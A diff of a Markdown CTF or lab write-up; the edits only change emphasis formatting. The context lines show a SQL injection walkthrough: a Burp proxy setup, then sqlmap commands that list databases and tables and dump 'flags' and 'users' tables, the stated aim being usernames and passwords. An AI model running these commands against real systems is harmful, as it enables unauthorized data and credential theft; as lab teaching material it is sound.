@@ -55,7 +55,7 @@ After the details are filled, click on **Save**, and activate the proxy.
 
 The Proxy gets set up.
 
-*__NOTE__ - The portswigger certificate should be downloaded.*
+***NOTE - The portswigger certificate should be downloaded***
 
 Once successfully downloaded, access the target login page (which is shown below).
 
@@ -84,7 +84,7 @@ To get the databases:
 
   `sqlmap -r <filename>.req --dbs`
  
-*__Output:__*
+*Output*
  
  ![Databases](Snaps/terminal1.png)
  
@@ -97,7 +97,7 @@ To get the tables:
 
   `sqlmap -r <filename>.req -D dbs --tables`
  
- *__Output:__*
+ *Output*
  
  ![Tables](Snaps/terminal2.png)
  
@@ -108,7 +108,7 @@ To get the tables:
    
    `sqlmap -r <filename>.req -D dbs -T flags --dump`
 
-*__Output:__*
+*Output*
 
 ![flag Dump](Snaps/terminal4.png)
 
@@ -122,7 +122,7 @@ The aim here is to dump the table entries and get the usernames and passwords.
   
   `sqlmap -r <filename>.req -D dbs -T users --dump`
 
-*__Output:__*
+*Output*
 
 ![users Dump](Snaps/terminal5.png)
 
